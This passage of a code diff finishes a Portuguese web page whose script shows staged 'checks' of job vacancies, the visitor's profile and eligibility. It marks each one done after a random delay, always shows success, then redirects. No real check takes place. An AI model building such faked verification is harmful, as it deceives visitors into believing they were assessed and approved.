+            container.innerHTML = '';
+            
+            const verificacoes = [
+                'Verificando vagas disponíveis...',
+                'Analisando seu perfil...',
+                'Confirmando elegibilidade...'
+            ];
+            
+            let currentIndex = 0;
+            
+            function addNextVerification() {
+                if (currentIndex >= verificacoes.length) {
+                    // Fim das verificações - mostra sucesso
+                    setTimeout(() => {
+                        document.getElementById('modalChecking').classList.add('hide');
+                        document.getElementById('modalSuccess').classList.add('show');
+                    }, 600);
+                    return;
+                }
+                
+                // Cria novo elemento
+                const item = document.createElement('div');
+                item.className = 'verification-item';
+                item.innerHTML = `
+                    <span class="verification-icon checking">⟳</span>
+                    <span class="verification-text">${verificacoes[currentIndex]}</span>
+                `;
+                container.appendChild(item);
+                
+                // Anima entrada
+                setTimeout(() => item.classList.add('visible', 'checking'), 50);
+                
+                // Após 0.8-1.2 segundos, marca como concluído (mais rápido)
+                const duration = 800 + Math.random() * 400;
+                setTimeout(() => {
+                    item.classList.remove('checking');
+                    item.classList.add('done');
+                    item.querySelector('.verification-icon').classList.remove('checking');
+                    item.querySelector('.verification-icon').classList.add('done');
+                    item.querySelector('.verification-icon').textContent = '✓';
+                    
+                    currentIndex++;
+                    // Próxima verificação após 200ms (mais rápido)
+                    setTimeout(addNextVerification, 200);
+                }, duration);
+            }
+            
+            // Inicia após 300ms (mais rápido)
+            setTimeout(addNextVerification, 300);
+        }
+        
+        function prosseguir() {
+            window.location.href = 'inicio/';
+        }
+    </script>
+
+</body>
+</html>
